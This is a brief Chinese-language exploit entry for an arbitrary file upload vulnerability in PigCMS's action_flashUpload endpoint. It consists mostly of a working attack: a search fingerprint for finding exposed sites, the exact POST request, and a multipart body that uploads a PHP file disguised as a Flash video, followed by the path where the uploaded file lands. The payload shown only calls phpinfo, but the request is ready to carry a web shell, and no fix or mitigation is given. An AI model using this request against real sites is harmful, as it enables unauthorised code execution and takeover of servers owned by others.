# PigCMSaction_flashUpload任意文件上传漏洞

- **系统**：PigCMSaction　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="/tpl/Home/pigcms/common/js/daohang.js"`
- **请求**：`POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=----aaa`

**请求体 / payload**
```
------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv
<?php phpinfo();?>
------aaa

上传文件位置
/cms/upload/images/2023/11/11/1699633023MuDd.php
```

**其他**
- PigCMS action\_flashUpload 任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * PigCMS